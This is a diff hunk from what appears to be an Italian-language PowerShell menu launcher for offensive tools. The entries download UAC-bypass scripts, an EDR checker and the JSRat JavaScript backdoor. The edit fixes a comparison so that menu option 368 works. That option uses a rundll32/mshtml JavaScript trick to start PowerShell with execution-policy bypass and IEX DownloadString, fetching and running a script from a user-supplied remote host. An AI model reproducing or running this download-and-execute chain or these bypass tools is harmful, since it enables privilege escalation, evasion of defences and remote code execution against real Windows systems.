@@ -619,7 +619,7 @@ while($true){
         '365' {Scarica "gushmazuko/WinBypass/EventVwrBypass" "EventVwrBypass.ps1" "gushmazuko/WinBypass/master/EventVwrBypass.ps1"}
         '366' {Scarica "gushmazuko/WinBypass/DiskCleanupBypass_direct" "DiskCleanupBypass_direct.ps1" "gushmazuko/WinBypass/master/DiskCleanupBypass_direct.ps1"}
         '367' {ScaricaBat "Mncx86/Windows-10-UAC-bypass" "uacdisabler.bat" "Mncx86/Windows-10-UAC-bypass/master/uacdisabler.bat"}
-        '368' {write-host "Digit a remote file to download"; $MIP=read-host "(example, http://10.11.12.13/script.ps1)"; if($MIP -le ""){rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('$MIP');"}}
+        '368' {write-host "Digit a remote file to download"; $MIP=read-host "(example, http://10.11.12.13/script.ps1)"; if($MIP -ne ""){rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('$MIP');"}}
         '369' {ScaricaSSL "PwnDexter/SharpEDRChecker/1.1" "SharpEDRChecker.exe" "PwnDexter/SharpEDRChecker/releases/download/1.1/SharpEDRChecker.exe"}
         '370' {Scarica "3gstudent/Javascript-Backdoor (real name, JSRat)" "JSRat.ps1" "3gstudent/Javascript-Backdoor/master/JSRat.ps1"}
         '371' {ScaricaSSL "icsharpcode/AvaloniaILSpy" "ILSpy-win-x64-Release.zip" "icsharpcode/AvaloniaILSpy/releases/download/v5.0-rc2/ILSpy-win-x64-Release.zip"}
